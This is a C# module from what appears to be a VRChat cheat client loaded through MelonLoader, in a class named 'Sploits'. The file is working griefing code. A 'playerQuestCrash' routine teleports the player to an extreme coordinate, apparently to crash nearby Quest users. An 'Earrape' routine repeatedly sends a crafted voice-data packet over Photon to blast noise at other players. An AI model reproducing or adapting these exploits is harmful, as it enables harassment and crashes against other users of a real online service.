using System;
using brewchat.hybridxcore.bep.Game.Wrappers;
using Brewchat.Game.Wrappers;
using ExitGames.Client.Photon;
using UnityEngine;
using VRC.SDKBase;

namespace autumn.ml.Cheat.Modules.Global;

public class Sploits
{
    public static UnityEngine.Vector3 SavedPosition;
    public static object CoroutinePlayer;
    public static object Earrape;
    public static System.Collections.IEnumerator event1_voiceData(string packet)
    {
        while (true)
        {
            byte[] payload = Convert.FromBase64String(packet);
            byte[] serverTime = BitConverter.GetBytes(Networking.GetServerTimeInMilliseconds());
            Buffer.BlockCopy(serverTime, 0, payload, 0, 4);
            GameUtils.Gameplay.PhotonUtils.SendRaiseEvent((byte)GameUtils.Gameplay.PhotonUtils.Events.VoiceData, payload, SendOptions.SendUnreliable);
            yield return new WaitForSeconds(1);
        }


    }
    private static System.Collections.IEnumerator playerQuestCrash()
    {
        var plr = GameUtils.PlayerModel.LocalEntity().gameObject.transform;
        SavedPosition = plr.position;
        plr.transform.position = new UnityEngine.Vector3(0, -100000000000, 0);
        yield return new WaitForSeconds(5);
        plr.transform.position = SavedPosition;
    }
    public static void playerQuestCrashInternalFunction(bool Enable)
    {
        if (Enable)
        {
            CoroutinePlayer = MelonLoader.MelonCoroutines.Start(playerQuestCrash());
        }
        else
        {
            MelonLoader.MelonCoroutines.Stop(CoroutinePlayer);
        }

    }
     public static void playerEarrape(bool Enable)
    {
        if (Enable)
        {
            Earrape = MelonLoader.MelonCoroutines.Start(event1_voiceData(Entry.config.Modules.Exploits.Global.currentPayload));
        }
        else
        {
            MelonLoader.MelonCoroutines.Stop(Earrape);
        }
        
    }
}
